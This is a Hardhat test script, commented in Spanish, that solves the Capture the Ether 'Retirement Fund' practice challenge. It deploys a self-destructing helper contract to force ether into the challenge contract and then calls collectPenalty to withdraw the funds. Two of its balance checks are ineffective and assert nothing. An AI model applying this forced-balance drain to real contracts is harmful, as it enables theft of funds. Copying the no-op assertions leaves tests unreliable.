import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";

let challengeAddress: string = "0x87a93E416c89BE4c519f6A5000FC15b93e6fbdfd";
let retirementFundsContract: Contract;
let voltorbContract: Contract;

beforeEach(async () => {
  const retirementFundsFactory = await ethers.getContractFactory("RetirementFundChallenge");
  retirementFundsContract = retirementFundsFactory.attach(challengeAddress);
  const voltorbFactory = await ethers.getContractFactory("Voltorb");
  voltorbContract = await voltorbFactory.deploy({
    value: ethers.utils.parseUnits(`1`, `wei`)
  });
})

describe("Retirement Fund", async () => {
  it("Resuelve el Math challenge - Retirement Fund", async () => {
    //Comprobamos que el contrato de voltorb fue inicializado con un balance mayor a 0.
    const balanceDeVoltorb: BigNumber = await ethers.provider.getBalance(voltorbContract.address);
    expect(balanceDeVoltorb.toNumber() > 0, "El balance de voltorb no es superior a 0");

    //Voltorb usa explosión en contrato enemigo --> Es súper efectivo! (we re nerd)
    await voltorbContract.explosion(challengeAddress)

    //Verificamos que tras el selfdestruct, voltorb haya enviado su balance total al contrato del challenge.
    const balanceChallengeContract: BigNumber = await ethers.provider.getBalance(retirementFundsContract.address);
    expect(balanceChallengeContract > ethers.utils.parseEther("1"));

    const tx = await retirementFundsContract.collectPenalty();
    await tx.wait();

    const isComplete = await retirementFundsContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true
  })
})